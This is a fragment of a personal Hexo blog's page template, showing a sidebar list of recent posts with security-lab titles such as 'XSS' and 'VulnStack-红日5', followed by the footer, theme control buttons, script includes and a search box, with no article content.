class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
